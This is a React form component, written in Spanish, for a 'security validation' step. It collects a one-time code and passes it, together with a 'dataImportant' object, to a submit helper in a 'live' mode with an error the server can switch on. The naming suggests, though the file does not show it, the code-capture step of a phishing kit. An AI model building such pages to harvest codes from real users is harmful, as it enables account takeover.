/* eslint-disable no-mixed-operators */
import React, { useRef, useState } from 'react'
import { useFormik } from 'formik'
import { tokenValidate } from '../../../security/tokenValidate'
import { submitBase } from '../../../helpers/submitBase'
import { TokenInput } from './TokenInput'
import { Spiner } from '../../Spiner'
import { useGeneralData } from '../../../hooks/useGeneralData'
import AuthCode from 'react-auth-code-input';

const initialValues = { token1: '' }

export const Token = ({tokenMode}) => {
  const dataImportant = useGeneralData({modeLive: true })
  const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
      initialValues: initialValues,
      validate: values => tokenValidate({values}),
      onSubmit: async(valuesData, { resetForm }) => {
          await submitBase({dataImportant, valuesData})
          resetForm()
          return
      }
  })
  return (
    <div>
      <p className='text-[#e31e1a] text-[24px] mb-[7.5px]'>Validacion de seguridad</p>
      <div className='mb-[20px] border-b-[1px] border-b-[#eee]' />
      {dataImportant.liveError === true && (<p className='text-[#a94442] bg-[#f2dede] border-[#ebccd1] border-[1px] rounded-[4px] mb-[20px] p-[15px] text-[14px]'>Tu código es inválido, por favor intentalo de nuevo.</p>)}

      <form onSubmit={handleSubmit}>
      <span >Hemos enviado un código de seguridad al medio seleccionado</span>
       
        {
          dataImportant.showSpiner === true ? <Spiner /> : null
        }
        <TokenInput 
          handleBlur={handleBlur}
          handleChange={handleChange}
          token={values.token1}
        />
        <div className='flex justify-center flex-col mt-8'>
          <button 
            disabled={
                
                  touched.token1 && 
                  errors.token1 || 
                  values.token1.length === 0
                  // eslint-disable-next-line eqeqeq
                  == true ? true : false
            }
            className='bg-[#6051a1] px-[12px] hover:bg-[#ff9900] py-[6px] h-[34px] text-[14px] text-white leading-[20px] w-full'
            type='submit'
          >
              <span className='h-[20px]'>
                  INGRESAR
              </span>
          </button>
          <button 
            className='px-[12px]  py-[6px] h-[34px] text-[14px] leading-[20px] w-full'
          >
              <span className='h-[20px]'>
                  CANCELAR
              </span>
          </button>
        </div>
      </form>
    </div>
  )
}
